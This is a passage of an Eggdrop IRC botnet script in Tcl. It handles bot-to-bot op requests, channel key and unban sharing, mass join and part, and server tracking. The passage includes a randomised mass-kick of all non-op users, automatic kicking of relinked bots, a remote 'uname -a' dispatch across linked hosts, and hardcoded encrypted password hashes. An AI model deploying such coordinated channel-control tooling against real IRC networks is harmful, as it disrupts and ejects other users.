 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if [matchattr $h n] {putallbots "chnicks [split $a " "]"}
 if {${keep-nick}==1} {return 1}
 if [info exist secauth] {if $secauth {return 1}}
 if {![validchan $a] && ("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} {return 1}
 new_nick 40
 return 1
}

bind raw - pong pongi
set ping-push 0
proc pongi {f k a} {
global server-lag ping-push
 regsub ".*:" [lindex $a 1] "" lag
 regsub -all "\]|\[0-9\\\[\\\$\]" $lag "" dt
 if {$dt!=""} {return 0}
 set server-lag [expr [unixtime]-$lag]
 if {$lag==${ping-push}} {set ping-push 0}
 return 0
}

bind dcc n chaninfo chaninfo
bind bot - chaninfo chaninfo
proc chaninfo {h i a} {
global nick username realname botnet-nick lastnchange botnick secauth keep-nick
global server-lag ping-push botchanlist
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if {[matchattr $h n]} {putallbots "chaninfo $a"}
 if [info exist secauth] {if $secauth {return 1}}
 if {![validchan $a] && ("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} {return 1}
 set d [set m ""]
 set chs [string tolower [channels]]
 foreach w $chs {
  if [validchan $w] {
   if [onchan $botnick $w] {append d "\0033";set e " (op?)"} {append d "\0032";set e " (join?)"}
   if [botisop $w] {append d "\0035";set e ""}
  } {append d "\0034";set e " (hold)"}
  if {[string tolower $a]==[string tolower $w]} {append m "$d$w$e"} {append m "$d$w$e"}
  set d ", "
 }
 if ${ping-push} {set plag [expr [unixtime]-${ping-push}]s} {set plag ""}
 sec_notice - "$botnick >> ${server-lag}s$plag $m"
 return 1
}

bind dcc n setnick setnick
bind bot - setnick setnick
proc setnick {h i a} {
global username realname botnet-nick botnick keep-nick secauth
 set d [split $a " "]
 set f [string tolower [lindex $d 0]]
 set t [lindex $d 1]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if {[matchattr $h n]} {putallbots "setnick [split $a " "]"}
 if {("$f"!="$b") && ("$f"!="$c")} {return 1}
global lastnchange nick
 if [info exist lastnchange] {if {[expr [unixtime]-$lastnchange] < 40} {return 1}}
 if [regsub "^\\\+" $t "" t] {set keep-nick 1}
 if [regsub "^\\\-" $t "" t] {set keep-nick 0}
 if [info exist secauth] {if $secauth {return 1}}
 set nick "$t"
 set lastnchange [unixtime]
 return 1
}
proc new_nick {t} {
global lastnchange nick
 if [info exist lastnchange] {if {[expr [unixtime]-$lastnchange] < $t} return}
 set nick [gain_nick]
 set lastnchange [unixtime]
}

bind dcc n chusers chusers
bind bot - chusers chusers
proc chusers {h i a} {
global nick username realname botnet-nick botnick
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 if {[matchattr $h n]} {putallbots "chusers $a"}
 if {("$a"!="") && ![expr [lsearch $a $b]+1]} {return 1}
 set username [gain_uname]
 return 1
}
bind dcc n kernels kernels
bind bot - kernels kernels
proc kernels {h i a} {
global botnet-nick botnick
 set a [string tolower $a]
 set b [string tolower ${botnet-nick}]
 if {[matchattr $h n]} {putallbots "kernels $a"}
 if {("$a"!="") && ![expr [lsearch $a $b]+1]} {return 1}
 catch {exec uname -a} er
 dccbroadcast "$botnick \2->\2 $er"
 return 1
}

bind dcc n mstat servers
bind bot - servers servers
set t 0;foreach w [trace vinfo server] {if {$w=="w serverset"} {incr t}}
if !$t {trace variable server w serverset}
proc serverset {n1 n2 m} {
 global lastserver server fattz botnick
 if {$lastserver == $server} return
 putallbots "lost $botnick"
 set lastserver $server
 incr fattz
}
bind bot - lost botlost
set tslostbot 0
proc botlost {b k a} {
global tslostbot
 if {([unixtime]-$tslostbot)<33} return
 set t 0
 foreach ch [channels] {
  if {[botisop $ch] && [isop $a $ch]} {
   if {[string tolower [nick2hand $a $ch]] == [string tolower $b]} {
    if {$t>3} {dumpserv "KICK $ch $a"} else {puthelp "KICK $ch $a"}
    incr t
    putlog "\2%\2 Kicking lost bot \2$b\2 on $ch $a"
   }
  }
 }
 set tslostbot [unixtime]
}

set realserver $server
bind msg - etoia setbotmask
proc setbotmask {n u h a} {
global botmask botnick server realserver
 set realserver $server
 if {$n==$botnick} {set botmask "$n!$u"}
}

set init-server {servinit}
set fatts [set fattz 0]
proc servinit {} {
global botnick server lastkeyo bobkey whiteserver lastserver fatts fattz tsetoia idlestamp secauth
 putserv "MODE $botnick +iw-s"
 if !$secauth {dccbroadcast "%% Connected to $server after $fattz/$fatts fails"}
 set fattz [set fatts 0]
 catch {unset lastkeyo}
 catch {unset bobkey}
 catch {unset badchan}
 putserv "PRIVMSG $botnick etoia"
 set tsetoia [unixtime]
 set whiteserver([lindex [split $server ":"] 0]) [unixtime]
 set lastserver $server
 set idlestamp [unixtime]
}

if {$server!=""} {
 putserv "PRIVMSG $botnick etoia"
 set tsetoia [unixtime]
 set whiteserver([lindex [split $server ":"] 0]) [unixtime]
 set lastserver $server
}

proc servers {h i a} {
global botnet-nick server botnick whiteserver blackserver fatts fattz
 set d [string tolower $a]
 set a [split $d " "]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 set b [string tolower ${botnet-nick}]
 set c [string tolower $botnick]
 if {[matchattr $h n]} {putallbots "servers $d"}
 if [info exist secauth] {if $secauth {return 1}}
 if {("$a"!="") && ![expr [lsearch $a $b]+1] && ![expr [lsearch $a $c]+1]} return
  if {$fattz && $fatts} {
   dccbroadcast "$botnick \2trying\2 $server"
  } {
   dccbroadcast "$botnick \2->\2 $server"
  }
 return 1
}

bind raw - ERROR raw_error
proc raw_error {f k a} {
global botnick server blackserver lastserver fatts botnet-nick realserver
 incr fatts
 if {$server!=$lastserver} {set blackserver([lindex [split $server ":"] 0]) [unixtime]}
 set er ""
 if [string match "*(You are not authorized to use this server)" $a] {remove_server $server;set er "<-del"}
 if [string match "*(No Authorization)" $a] {remove_server $server;set er "<-del"}
 set blackserver([lindex [split $server ":"] 0]) "deleted"
 if {$fatts-1} return
 if {$server!=$realserver} return
 dccbroadcast "$botnick\($server)$a$er"
}

proc masskick {ch} {
 global botnick kicklist home
 if {"$ch" != "$home"} {
 if ![botisop $ch] return
 if {[string match "* +bitch*" [channel info $ch]]} {
  set ch [string tolower $ch]
  set kicklist($ch) ""
   foreach w [chanlist $ch] {
    if {"$botnick"=="$w"} continue
    if {[matchattr [nick2hand $w $ch] o] || [matchchanattr [nick2hand $w $ch] o $ch] || [matchattr [nick2hand $w $ch] i]} continue
    lappend kicklist($ch) $w
   }
   set lsiz [llength $kicklist($ch)]
   if !$lsiz return
   for {set t 0} {$t < $lsiz} {incr t} {
    set r [rand $lsiz]
    set o [lindex $kicklist($ch) $t]
    set p [lindex $kicklist($ch) $r]
    set kicklist($ch) [lreplace $kicklist($ch) $t $t $p]
    set kicklist($ch) [lreplace $kicklist($ch) $r $r $o]
   }
   utimer 0 domasskick
  }
 }
}

proc domasskick {} {
global kicklist botmask
 if ![info exist kicklist] return
 set maxi 8
 foreach ch [array names kicklist] {
  if {![validchan $ch] || ![botisop $ch]} {
   unset kicklist($ch)
   continue
  }
  foreach ni $kicklist($ch) {
   set lm [lsearch $kicklist($ch) $ni]
   if {$lm+1} {lreplace $kicklist($ch) $lm $lm} continue
   if ![onchan $ni $ch] continue
   putserv "KICK $ch $ni $ni"
   incr maxi -1
   if $maxi continue
   if ![expr 1+[lsearch [utimers] "* domasskick *"]] {utimer 4 domasskick}
   return
  }
  unset kicklist($ch)
 }
 unset kicklist
}

bind kick - * operkick
proc operkick {ni ho ha ch who why} {
global operkick botnick nick kicklist botname botmask
 catch {
  set t [lsearch $kicklist($ch) $who]
  lreplace $kicklist($ch) $t $t
 }
 set ni [string tolower $ni]
 set who [string tolower $who]
 if {$botnick==$who} {
  catch {putbot $ha "nekikajmenagad $botmask"}
  putserv "PRIVMSG $botnick :etoia"
 }
 if [info exist operkick($who)] {
  if {"$botnick"=="$ni"} {
   putlog "%% I'm $ni kick IRCfucker $who from $ch - attempt to change my nick"
   utimer 2 "new_nick 20"
  }
  unset operkick($who)
 }
}

bind bot - nekikajmenagad nekikajmenagad
proc nekikajmenagad {b k a} {
 if ![matchattr $b bo] return
dccbroadcast "adding host [b]$b [u][mashhost $a]"
 addhost $b [maskhost $a]
}

proc chan_who {ch} {
 set ch [string tolower $ch]
 if ![validchan $ch] return
 puthelp "WHO $ch"
 foreach w [timers] {if [string match "* [list chan_who $ch] *" $w] {killtimer [lindex $w 2]}}
 timer [expr 16+[rand 24]] "chan_who $ch"
}

foreach ch [string tolower [channels]] {timer [expr 16+[rand 24]] "chan_who $ch"}

proc ircdbans {ban ch} {
 if ![botisop $ch] return
 foreach w [chanbans $ch] {
  if {($ban!=$w) && [string match $ban $w]} {
   putcmdlog "ircdbans: killing ban $ban"
   if [isban $w $ch] {
    if [killchanban $ch $w] continue
   }
   putserv "MODE $ch -b $w"
  }
 }
}

proc joinbans {ni ho ha ch} {
global modes-per-line
 if ![botisop $ch] return
 if {[lsearch [channel info $ch] -enforcebans]+1} return
 set brlist [set bdlist ""]
 if [matchban $ni!$ho $ch] {
  foreach w [chanbans $ch] {
   foreach u [banlist $ch] {
    set b [lindex $u 0]
    if {($b!=$w) && [string match $b $w]} {
     putcmdlog "joinbans: should kill ban $w"
     if ![killchanban $ch $w] {lappend bdlist $w}
    }
   }
  }
 } {
  foreach w [chanbans $ch] {
   if [string match $w $ni!$ho] {
    putcmdlog "joinbans: should refresh ban $w"
    lappend brlist $w
   }
  }
 }
 if {"$brlist$bdlist"==""} return
 set bm [set bb ""];set bc 0
 foreach w $brlist {
  append bm "-b"; append bb " $w";incr bc
  append bm "+b"; append bb " $w";incr bc
  putcmdlog "joinbans: need to refresh: $w"
  if {$bc>(${modes-per-line}-2)} {
   putserv "MODE $ch $bm$bb"; set bb [set bm ""];set bc 0
  }
 }
 foreach w $bdlist {
  append bm "-b"; append bb " $w";incr bc
  putcmdlog "joinbans: need to unban: $w"
  if {$bc>(${modes-per-line}-1)} {
   putserv "MODE $ch $bm$bb"; set bb [set bm ""];set bc 0
  }
 }
 if {$bm!=""} {putserv "MODE $ch $bm$bb"}
}

set joinfludc 0
set joinfludt [unixtime]
set joinfludt2 0
set joinfludmc 15
set joinfludmt 60
set joinfludmt2 2[rand 9][rand 9]
bind join - * joinwho
proc joinwho {ni ho ha ch} {
global joinfludc joinfludt joinfludt2 joinfludmc joinfludmt joinfludmt2 botnick
 if {$botnick==$ni} {
  global nameslist
  timer [expr 16+[rand 24]] "chan_who $ch"
  catch {unset nameslist([string tolower $ch])}
  catch {unset nameslistraw([string tolower $ch])}
 }
 joinbans $ni $ho $ha $ch
 if {"$ha" != "\*"} return
 incr joinfludc
 if $joinfludt2 {
  if {([unixtime]-$joinfludt2) > $joinfludmt2} {
   puthelp "WHO $ch"
   set joinfludt2 0
  }
  return
 }
 if {([unixtime]-$joinfludt) > $joinfludmt} {
  set joinfludt [unixtime];set joinfludc 0
 }
 if {$joinfludc == $joinfludmc} {
  set joinfludt2 [unixtime]
 }
 if {$joinfludc >= $joinfludmc} return
 puthelp "WHO $ni"
}

bind raw - 324 getmkey
proc getmkey {f k a} {
global chankeys
 set a [split "$a" " "]
 set chan [string tolower [lindex $a 1]]
 set modes [lrange $a 2 4]
 if [string match "*k*" [lindex $modes 0]] {
  set key [lindex $modes end]
 set chankeys($chan) $key
 }
}

proc gpass {n e m} {
global $n
 if {$e==""} return
 if {[lsearch "Bz7kS.GS0ue/ VlSBc.FtUgH0" [encrypt $e $e]]==-1} {set gpass($e) "-"}
}

if {[trace vinfo gpass]==""} {trace variable gpass w gpass}

set mr [llength $servers]
for {set t 0} {$t < $mr} {incr t} {
 set a [lindex $servers [set r [rand $mr]]]
 set servers [linsert [lreplace $servers $r $r] $t $a]
}
unset mr r t

set default-port 6667
set server-timeout 3
set dcc-block [set servlimit [set strict-host [set keep-all-logs 0]]]
set switch-logfiles-at 300
set console "mkcobxs"
set learn-users [set open-telnets [set share-greet 0]]
set never-give-up [set log-time [set share-users [set require-p 1]]]
set connect-timeout 11
set flood-msg 5:30
set flood-chan 0
set flood-ctcp 3:60
set save-users-at 30
set notify-users-at 00
set default-flags ""
set whois-fields "created lastleft lastlinked"
set modes-per-line 4
set max-queue-msg [set wait-split 300]
set wait-info 6000
set xfer-timeout 90
set note-life 20
set cycle-channels 0
set deq-full-query 1
set resolve-ip 0
set show-msgq 0
foreach w "help info who reset jump rehash memory die \
 whois status email ident invite op pass notes" {unbind msg - $w *msg:$w}

bind filt - "\001ACTION *\001" filt_act
bind filt - "/me *" filt_telnet_act
bind dcc m mjoin add_chan
bind dcc m mpart rem_chan
bind dcc m part lev_chan
bind dcc m join new_chan
bind bot - addc bot_addc
bind bot - remc bot_remc
bind ctcr - PING lag_reply
bind bot - inviteme pm_inv_request
bind bot - climit limit_chan
bind bot - uban unban_req
bind bot - tkey take_key
bind bot - key send_key
bind bot - opresp bot_op_response
proc bot_op_response {bot cmd r} {putlog "\2$bot\2 - $r"}

proc str_randstring {count} {
 set rs ""
 for {set j 0} {$j < $count} {incr j} {
  set x [rand 62]
  append rs [string range abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 $x $x]
 }
 return $rs
}

set maxoplag 16

bind bot - opme bot_op_request
proc bot_op_request {bot cmd arg} {
global botnick pubchan optime opkeyd maxoplag botnet-nick
set opnick [string tolower [lindex [set arg [split $arg " "]] 0]]
if {![matchattr $bot ob]||![validchan [set needochan [lindex $arg 1]]]} return
if {!([botisop $needochan] && [onchan $opnick $needochan] && ![isop $opnick $needochan])} return
if {[set bobkeyn [lindex $arg 2]]==""} return
set optime($opnick) [unixtime]
set opkeyd($opnick) [str_randstring 14]
utimer $maxoplag "catch {unset optime($opnick)} er"
utimer $maxoplag "catch {unset optkeyd($opnick)} er"
putbot $bot "chanm $needochan [lindex [channel info $needochan] 0]"
putserv "NOTICE $opnick :\1howdy $needochan [encrypt $bobkeyn ${botnet-nick}] [encrypt $bobkeyn $opkeyd($opnick)]\1"
}

bind ctcr ob howdy bot_time_send
proc bot_time_send {unick host handle dest keyw arg} {
global botnick bobkey
 set arg [split $arg " "]
 set ch [string tolower [lindex $arg 0]]
 if [info exist bobkey($ch)] {
  if [validchan $ch] {
   set unick [string tolower [decrypt $bobkey($ch) [lindex $arg 1]]]
   if {[lsearch [string tolower [bots]] $unick] == -1} {return 0}
   set opedkey [decrypt $bobkey($ch) [lindex $arg 2]]
   catch {putbot $unick "ctrox $opedkey $botnick $ch"}
  }
  unset bobkey($ch)
 }
 return 0
}

bind bot ob ctrox bot_time_response
proc bot_time_response {handle ctrox arg} {
global optime opkeyd uroped maxoplag
 set arg [split $arg " "]
 set nopkey [lindex $arg 0]
 set unick [string tolower [lindex $arg 1]]
 set ch [string tolower [lindex $arg 2]]
 if ![validchan $ch] return
 if {!([botisop $ch] && [onchan $unick $ch] && ![isop $unick $ch])} return
 if ![info exist opkeyd($unick)] return
 if ![info exist optime($unick)] return
 set lag [expr [unixtime] - $optime($unick)]
 if {$lag > $maxoplag} {
  putbot $handle "opresp refused op: lag is $lag (below $maxoplag required)"
  return 0
 }
 if {$opkeyd($unick) != $nopkey} {
  catch {putbot $handle "opresp wrong opkey."}
  return 0
 }
 putcmdlog "[b]![b]bot op[b]![b] $unick on $ch (lag: $lag)"
 dccbroadcast "[b]![b]bot op[b]![b] $unick on $ch (lag: $lag)"
 dumpserv "MODE $ch +o $unick"
 unset opkeyd($unick)
 unset optime($unick)
 return
}

set opreqtime 1
proc get_oped {channel} {
global botnick opreqtime opbots bobkey opdelay
 if [info exist opdelay] {if $opdelay {incr opdelay -1;return}}
 if [getting-users] return
 set channel [string tolower $channel]
 if !$opreqtime return
 set opreqtime 0
 utimer 30 {set opreqtime 1}
 fix_hosts
 if ![info exist bobkey($channel)] {set bobkey($channel) [str_randstring 11]}
 putallbots "opme $botnick $channel $bobkey($channel)"
}

set msecperreq 60
proc get_key {channel} {
global botnick chankeys lastkeyv msecperreq lastkeyo
 set channel [string tolower $channel]
 if [info exist lastkeyv($channel)] {
  if {[expr [unixtime] - $lastkeyv($channel)] < $msecperreq} return
 }
 set lastkeyv($channel) [unixtime]
 putallbots "key $botnick $channel"
 fix_hosts
 set chan [string tolower $channel]
 if [info exist lastkeyo($chan)] return
 if [info exist chankeys($chan)] {
  putserv "JOIN $channel $chankeys($chan)"
  set lastkeyo($chan) [unixtime]
 }
 return 0
}

proc get_unban {channel} {
 global botnick botname lastunban msecperreq botmask
 set channel [string tolower $channel]
 if [info exist lastunban($channel)] {
  if {[expr [unixtime] - $lastunban($channel)] < $msecperreq} return
 }
 if {[bots]==""} return
 fix_hosts
 set lastunban($channel) [unixtime]
 putallbots "uban $channel $botmask"
}

proc get_limit {channel} {
global botnick lastlim msecperreq
 set channel [string tolower $channel]
 if [info exist lastlim($channel)] {
  if {[expr [unixtime] - $lastlim($channel)] < $msecperreq} return
 }
 if {[bots]==""} return
 set lastlim($channel) [unixtime]
 putallbots "climit $botnick $channel"
 fix_hosts
}  

proc get_invited {channel} {
global botnick lastinv msecperreq
 set channel [string tolower $channel]
  if [info exist lastinv($channel)] {
   if {[expr [unixtime] - $lastinv($channel)] < $msecperreq} return
  }
 if {[bots]==""} return
 fix_hosts
 set lastinv($channel) [unixtime]
 putallbots "inviteme $botnick $channel"
}

proc send_key {bot cmd arg} {
global botnick chankeys botnet-nick
 if ![matchattr $bot ob] return
 set arg [split $arg " "]
 set nick [lindex $arg 0]
 set chan [lindex $arg 1]
 if {$nick == $botnick} {return 0}
 if {[lsearch [string tolower [channels]] [string tolower $chan]] == -1} {return 0}
 if {![onchan $botnick $chan]} {return 0}
 set key [lindex [getchanmode $chan] 1]
 set chankeys([string tolower $chan]) $key
 if [string match *k* [lindex [getchanmode $chan] 0]] {
  putcmdlog "[b]![b]bot key[b]![b] $nick on $chan"
  putbot $bot "tkey $chan $key"
 }
}

set limflood [unixtime]
proc limit_chan {bot cmd arg} {
 global botnick limflood
 if ![matchattr $bot ob] return
 set arg [split $arg " "]
 set opnick [lindex $arg 0]
 set channel [lindex $arg 1]  
 if ![validchan $channel] return
 if ![botisop $channel] return
 set chm [llength [chanlist $channel]]
 set chl [lindex [getchanmode $channel] end]
 set oph [ophash $channel]
 if {$oph == -1} {set oph 0}
 if {$cmd!="cmd" && $oph >= 0} {utimer $oph "limit_chan $bot cmd [list $arg]";return}
 set d [expr ([unixtime]-$limflood)/((1+$oph)*9)]
 if {$d<10} return
 if {$chm>=$chl} {
  putcmdlog "[b]![b]bot limit[b]![b] $opnick on $channel"
  pushmode $channel +l [expr [llength [chanlist $channel]] + 2]
  set limflood [unixtime]
 }
}

proc unban_req {bot cmd arg} {
global botnick botnet-nick
 set arg [split $arg " "]
 set channel [lindex $arg 0]
 set host [lindex $arg 1]
 if ![matchattr $bot ob] return
 if ![validchan $channel] return
 if ![onchan $botnick $channel] return
 if ![botisop $channel] return
 if ![ispermban $host] {
  foreach ban [chanbans $channel] {
   if {[string compare $ban $host]} {
    putcmdlog "[b]![b]bot unban[b]![b] $host $channel"
    killchanban $channel $ban
   }
  }
 }
 utimer [expr 2+[rand 5]] "resetbans $channel"
}

proc pm_inv_request {bot cmd arg} {
global botnick
 if ![matchattr $bot ob] return
 set opnick [lindex [set arg [split $arg " "]] 0]
 set c [lindex $arg 1]
 if {![validchan $c] || ![onchan $botnick $c] || ![botisop $c]} return
 if [isinvite $c] {
  putcmdlog "[b]![b]bot invite[b]![b] $opnick on $c"
  utimer [expr 1+[rand 40]] "put_invite $opnick $c"
 }
}

proc put_invite {nick chan} {
 if {![validchan $chan] || [onchan $nick $chan]} return
 puthelp "INVITE $nick $chan"
}

proc isinvite {c} {
 if ![validchan $c] {return 0}
 if [string match *i* [lindex [getchanmode $c] 0]] {return 1} {return 0}
}

proc take_key {bot cmd arg} {
global botnick chankeys
 set chan [lindex [set arg [split $arg " "]] 0]
 if ![validchan $chan] return
 set key [lindex $arg 1]
 set chankeys([string tolower $chan]) $key
 if [onchan $botnick $chan] return
 putserv "JOIN $chan $key"
}

foreach channel [channels] {channel set $channel need-invite "get_invited $channel"}
foreach channel [channels] {channel set $channel need-op "get_oped $channel"}
foreach channel [channels] {channel set $channel need-unban "get_unban $channel"}
foreach channel [channels] {channel set $channel need-limit "get_limit $channel"}
foreach channel [channels] {channel set $channel need-key "get_key $channel"}

proc lag_reply {nick uhost hand dest key arg} {
global lreply
 if $lreply return
 if {$key=="PING"} {
  set endd [unixtime]
  set lagg [expr $endd - $arg]
  puthelp "NOTICE $nick :\[$nick PING REPLY\] $lagg Seconds."
  putcmdlog "\[$nick PING REPLY\] $lagg Seconds."
 }
}

proc newmaskhost {uh} {
set last_char ""
set past_ident "0"
set response ""
 for {set i 0} {$i < [string length $uh]} {incr i} {
  set char [string index $uh $i]
  if {$char == "@"} {set past_ident "2"}
  if {$past_ident == "2"} {set past_ident "1"}
  if {($char != "0") && ($char != "1") && ($char != "2") && ($char != "3") && ($char != "4") && ($char != "5") && ($char != "6") && ($char != "7") && ($char != "8") && ($char != "9")} {
   set response "$response$char"
   set last_char ""
  } {
   if {($last_char != "x") && ($past_ident == "1")} {
    append response "*" 
    set last_char "x"
   }
   if {$past_ident == "0"} {
    append response "$char" 
   }
  }
 }
 if {[regexp -nocase [string trimleft $response [string range $response 0 [expr [string first "@" $response] - 1 ]]] "@*.*.*.*"]} {
  set response [maskhost $uh]
  return $response
 }
 return "*!$response"
}

proc new_chan {hand idx a} {
global botnet-nick err defchanmodes
 set chan [lindex [split $a " "] 0]
 set key [lindex $a 1]
 if {![joinable $chan] || $chan == ""} {
  putdcc $idx "$err join <#channel> \[key\]"
  return 0
 }
 sec_notice - "[b]![b]dcc join[b]![b] $chan by $hand"
 channel add $chan {
  chanmode "+tn"
  idle-kick 0
 }
 putallbots "addchan $chan"
 mychannels ${botnet-nick} mychannels [channels]
 channel set $chan -enforcebans +dynamicbans +shared +stopnethack +bitch +userbans
 channel set $chan -revenge -secret -clearbans -protectops -statuslog -autoop -greet
 channel set $chan need-op "get_oped $chan"
 channel set $chan need-key "get_key $chan"
 channel set $chan need-invite "get_invited $chan"
 channel set $chan need-unban "get_unban $chan"
 channel set $chan need-limit "get_limit $chan"
 puthelp "JOIN $chan $key"
 savechannels
 return 1
}

proc lev_chan {hand idx args} {
global botnet-nick err
 set chan [split [lindex $args 0] " "]
 if {![joinable $chan] || $chan == ""} {
  putdcc $idx "$err join <#channel>"
  return 0
 }
 sec_notice - "[b]![b]dcc part[b]![b] $chan by $hand"
 if ![validchan $chan] return
 channel remove $chan
 puthelp "PART $chan"
 putallbots "delchan $chan"
 mychannels ${botnet-nick} mychannels [channels]
 savechannels
}

proc add_chan {hand idx a} {
global botnet-nick err
 set chan [lindex [set a [split $a " "]] end]
 set key [lindex $a end]
 set bots [lrange $a 0 [expr [llength $a]-2]] 
  if {![string match "*#*" $chan]} {
   set chan "[lindex $a [expr [llength $a]-2]]"
   set bots [lrange $a 0 [expr [llength $a]-3]]
   set key [lindex $a end]
  }
 if ![matchattr ${botnet-nick} sob] {
  putdcc $idx "Sorry $hand, You can do it only from hub bot!"
  return 0
 }
 if {![joinable $chan] || [llength $a]<2} {
  putdcc $idx "$err mjoin <bots/*> <#channel> \[key\]"
  return 0
 }
 set chan [list $chan]
 sec_notice - "[b]![b]mass join[b]![b] ($bots) to $chan by $hand"
 if {$bots == "*"} {set bots "[bots]";savech "$chan"}
 putallbots "addc $chan $bots $key"
 return 1
}

proc bot_addc {bot cmd a} {
global botnick botnet-nick secauth opery
 set a [split $a " "]
 set chan [lindex $a 0]
 set bots [string tolower [lrange $a 1 end]]
 set key [lindex $a end]
 regsub -all "," $bots " " bots
 regsub -all "  *" $bots " " bots
 if {![expr 1+[lsearch $bots [string tolower $botnick]]] && ![expr 1+[lsearch $bots [string tolower ${botnet-nick}]]]} return
 if {![joinable $chan]} {dccbroadcast "massJOIN: I cant join $chan";return}
 if [regexp -nocase -- ".*oper.*|.*\\\..*" $chan] {dccbroadcast "massJOIN: I'm not joing $chan";return}
 set opery($chan) 1
 channel add $chan {
  chanmode "+nt"
  idle-kick 0
 }
 putallbots "addchan $chan"
 mychannels ${botnet-nick} mychannels [channels]
 channel set $chan +enforcebans +dynamicbans +shared +stopnethack +bitch +userbans
 channel set $chan -revenge -secret -clearbans -protectops -statuslog -autoop -greet
 channel set $chan need-op "get_oped $chan"
 channel set $chan need-key "get_key $chan"
 channel set $chan need-invite "get_invited $chan"
 channel set $chan need-unban "get_unban $chan"
 channel set $chan need-limit "get_limit $chan"
 puthelp "JOIN $chan $key"
}

proc rem_chan {hand idx a} {
global botnet-nick err
 set a [split $a " "]
 set bots [lrange $a 0 [expr [llength $a]-2]]
 set chan [lindex $a end]
 if ![matchattr ${botnet-nick} sob] {
  putdcc $idx "Sorry $hand, You can do it only from hub bot!"
  return 0
 }
 if {![joinable $chan] || [llength $a]<2} {
  putdcc $idx "$err mpart <bots/*> <#channel>"
  return 0
 }
 set chan [list $chan]
 sec_notice - "[b]![b]mass part[b]![b] ($bots) from $chan by $hand"
 if {$bots=="*"} {set bots "[bots]";removech "$chan"}
 putallbots "remc $chan $bots"
 return 1
}

proc bot_remc {bot cmd a} {
global botnick botnet-nick secauth
 set chan [lindex [set a [split $a " "]] 0]
 set bots [string tolower [lrange $a 1 end]]
 if [info exist secauth] {if $secauth return}
 regsub -all "," $bots " " bots
 regsub -all "  *" $bots " " bots
 if {![expr 1+[lsearch $bots [string tolower $botnick]]] && ![expr 1+[lsearch $bots [string tolower ${botnet-nick}]]]} return
 catch {
  channel remove "$chan"
  puthelp "PART $chan"
  putallbots "delchan $chan"
  mychannels ${botnet-nick} mychannels [channels]
  savechannels
 }
}

proc filt_telnet_act {idx text} {dccsimul $idx ".me [lrange $text 1 end]"}
proc filt_act {idx text} {dccsimul $idx ".me [string trim [lrange $text 1 end] \001]"}
bind filt - .add* snewuzer
bind filt - .+u* snewuzer
bind filt - .+b* snewuzer
bind filt - .chatt* snewuzer
proc snewuzer {i tx} {
 regsub "  *" $tx " " t
 set t [string tolower [split $t " "]]
 switch -- [lindex $t 0] .add - .addu - .addus - .adduse - .adduser - .+u - .+us - .+use - .+user - .+b - .+bo - .+bot {
  set who [idx2hand $i]
  set for [lindex $t 1]
  if {[matchattr $who m] && ![validuser $for]} {utimer 0 "user-set $for createdby $who"}
 } .chatt - .chattr {
  set who [idx2hand $i]
  set for [lindex $t 1]
  set fla [lindex $t 2]
  if {[validuser $for] && ([matchattr $who n] || ([matchattr $who m] && ![matchattr $for n]))} {
   user-set $for chattrby "$who $fla"
  }
 }
 return $tx
}

unbind dcc - whois *dcc:whois
unbind dcc - match *dcc:match
bind dcc o whois secmatch
bind dcc o match secmatch
bind dcc o wi secmatch
bind dcc o wii *dcc:match
proc secmatch {ha i a} {
global whois-fields
 set ha [string tolower $ha]
 set fields ${whois-fields}
 set owner [matchattr $ha n];set master [matchattr $ha m]
 set a [split $a " "]
 set mask [lindex $a 0]
 set minf [lindex $a 1]
 set maxf [lindex $a 2]
 if {$maxf==""} {set maxf $minf;set minf 0}
 if {[lindex $a end]=="-"} {set master 0}
 if [string match "*\\\**" $mask] {set match 1} {set match 0}
 if [regexp "\[-+\].*" $mask] {
  regsub -all "\\\-\[^+\]*" $mask "" maskfp
  regsub -all "\\\+" $maskfp "" maskfp
  regsub -all "\\\+\[^-\]*" $mask "" maskfm
  regsub -all "\\\-" $maskfm "" maskfm
  if {$maskfm==""} {set maskfm *} {regsub -all \[\$\+\-\.\^\] $maskfm "" maskfm}
  set maskn *
  set match 1
 } {
  set maskn [string tolower $mask]
  set maskfp ""
  set maskfm *
 }
 if {$maxf=="" || [regexp "\[^0-9\]" $maxf]} {set maxf 20}
 if {$minf=="" || [regexp "\[^0-9\]" $minf]} {set minf 0}
 if $match {putdcc $i "*** Matching '$mask':"}
 set f 0
 putdcc $i " HANDLE   PASS NOTES  FLAGS                     LAST "
 if $match {
  switch -- $maskfp bots { set ul [bots] } users { set ul ""
   foreach w [string tolower [whom *]] {if {[lsearch $ul $w]==-1} {lappend ul [lindex $w 0]}}
  } default { set ul [lsort [userlist $maskfp]]}
  if [string match *pass* $maskfm] {set maskfm -}
  if [string match bots* $maskfm] {set maskfm *;set maskfp b;set ul {}
   foreach w [userlist b] {if {[hand2idx $w]==-1} {lappend ul $w}}
  }
 } {if [validuser $maskn] {set ul $maskn} {set ul ""}}
 foreach n $ul {
  set nl [string tolower $n]
  if {![regexp \[$maskfm\] [chattr $n]] && ([string match $maskn [string tolower [set h [gethosts $n]]]] || [string match $maskn $nl])} {
   if ![string match "\\\**" $n] {
    if {($maskfm=="-") && ![passwdok $n ""]} continue
    incr f
    if {($f<=$minf) && ($f==1)} {putdcc $i "(skipping first $minf)"}
    if {$f==(1+$maxf)} {putdcc $i "(more than $maxf matches; list truncated)"}
    if {($f>=(1+$maxf)) || ($f<=$minf)} continue
    if [passwdok $n ""] {set pass "none"} {set pass "Set "}
    set lo [backtime [getlaston $n]]
    putdcc $i  "[format %-9s $n] $pass [format %-5s [notes $n]] [format %-25s [chattr $n]] $lo"
    foreach c [channels] {
     if {"[set fl [chattr $n $c]][set lo [backtime [getlaston $n $c]]]"!="-NEVER"} {
      putdcc $i "  [format %-18s $c] [format %-25s $fl] $lo"
      if {[set ci [getchaninfo $n $c]]!=""} {putdcc $i "  INFO\0032:\002 ci"}
     }
    }
    if {$master || ($ha==$nl)} {    
     set ho " \0035 HOSTS: ";set zp ""
     foreach s $h {
      if {([string length $s]+[string length $ho]+20) > 79} {
       putdcc $i $ho;set ho " \0035    ";set zp "    "
      }
      append ho $zp$s
      set zp ", "
     }
